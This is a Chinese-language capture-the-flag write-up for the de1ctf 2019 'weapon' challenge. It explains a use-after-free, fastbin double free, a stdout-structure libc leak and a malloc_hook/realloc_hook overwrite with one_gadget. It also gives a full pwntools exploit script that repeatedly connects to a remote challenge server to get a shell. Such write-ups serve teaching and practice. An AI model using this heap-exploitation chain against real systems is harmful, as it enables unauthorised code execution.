# de1ctf_2019_weapon



### 总结
本题与[这篇文章](https://www.cnblogs.com/LynneHuan/p/14618179.html)或者[这篇文章](https://roderickchan.github.io/2021/04/04/ycb-2020-babypwn/)的思路是一模一样的，但是由于有个`eidt`功能，所以利用起来更方便。
主要思路是：

- 构造`fastbin`和`unsorted bin`的`overlapped chunk`
- 爆破`1`个字节，利用`fastbin attack`分配`chunk`到`stdout`结构体上方，泄露`libc`地址
- 利用`fastbin attack`分配到`malloc_hook`上方，利用`realloc_hook`调整栈帧，使用`one_gadget`去`getshell`

<!-- more -->

### 题目分析

#### checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409200819.png)

保护全开，`libc`使用`2.23`。

#### 关键函数分析

##### delete_weapon

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409200911.png)

有一个`UAF`漏洞，可以利用`fastbin double free`来构造出`overlapped chunk`。

### 利用思路

利用步骤：

- 利用`UAF`漏洞构造出`overlapped fastbin chunk`，布局为`A--->B--->A`
- 踩`chunk A`的`fd`的低字节，申请`chunk`到`B`的上方
- 修改`B`的`chunk size`为`0x91`
- 构造`fastbin chunk`和`unsorted chunk`重合的堆布局
- 分配`fake chunk`到`stdout`结构体上方泄露`libc`地址，这里需要爆破1个字节
- 利用`realloc_hook + malloc_hook + one_gadget`获取`shell`

### EXP

#### 完整exp

```python
from pwn import *
import functools

LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.update(arch='amd64', os='linux', endian='little')


def create_weapon(size:int, idx:int, name, sh:tube):
    sh.sendlineafter("choice >> \n", '1')
    sh.sendlineafter("wlecome input your size of weapon: ", str(size))
    sh.sendlineafter("input index: ", str(idx))
    sh.sendafter("input your name:\n", name)


def delete_weapon(idx, sh:tube):
    sh.sendlineafter("choice >> \n", '2')
    sh.sendlineafter("input idx :", str(idx))


def rename_weapon(idx, name, sh:tube):
    sh.sendlineafter("choice >> \n", '3')
    sh.sendlineafter("input idx: ", str(idx))
    sh.sendafter("new content:\n", name)


def attack(malloc_hook_offset = 0x3c4b10, gadget = 0x4527a, realloc_offset = 0x84710, low_2th_byte=b'\xe5', sh:tube=None):
    create_weapon(0x60, 0, p64(0x71) * 10 + p64(0) + p64(0x71), sh)
    create_weapon(0x60, 1, p64(0x71) * 12, sh)
    create_weapon(0x60, 2, p64(0x51) * 12, sh)

    delete_weapon(0, sh)
    delete_weapon(1, sh)
    delete_weapon(0, sh)

    create_weapon(0x60, 3, b'\x50', sh)
    create_weapon(0x60, 3, b'\x50', sh)
    create_weapon(0x60, 3, b'\x50', sh)

    create_weapon(0x60, 4, 'a', sh)
    delete_weapon(1, sh)

    rename_weapon(4, p64(0x71) * 3 + p64(0x91), sh)
    delete_weapon(1, sh)

    rename_weapon(4, p64(0x71) * 3 + p64(0x71) + b'\xdd' + low_2th_byte, sh)

    create_weapon(0x60, 3, b'\x00', sh)

    create_weapon(0x60, 5, 0x33 * b'\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\x58', sh)

    leak_libc_addr = u64(sh.recvn(8))
    LOG_ADDR('leak_libc_addr', leak_libc_addr)
    libc_base_addr = leak_libc_addr -  0x3c56a3
    LOG_ADDR('libc_base_addr', libc_base_addr)

    delete_weapon(1, sh)
    rename_weapon(4, p64(0x71) * 3 + p64(0x71) + p64(libc_base_addr + malloc_hook_offset - 0x23), sh)
    create_weapon(0x60, 3, 'a', sh)
    create_weapon(0x60, 3, 0xb * b'a' + p64(libc_base_addr + gadget) + p64(libc_base_addr + realloc_offset + 0xd), sh)

    sh.sendlineafter("choice >> \n", '1')
    sh.sendlineafter("wlecome input your size of weapon: ", str(64))
    sh.sendlineafter("input index: ", str(0))

    sh.sendline('id')
    sh.recvline_contains(b'uid', timeout=1)
    sh.interactive()

if __name__ == '__main__':
    sh = None
    while True:
        try:
            sh = remote('node3.buuoj.cn', 25668)
            attack(realloc_offset=0x846c0, gadget=0x4526a, sh=sh)
        except:
            try:
                sh.close()
            except:
                pass

```

#### 效果展示

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210409201602.png)



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-04-09-de1ctf-2019-weapon/  

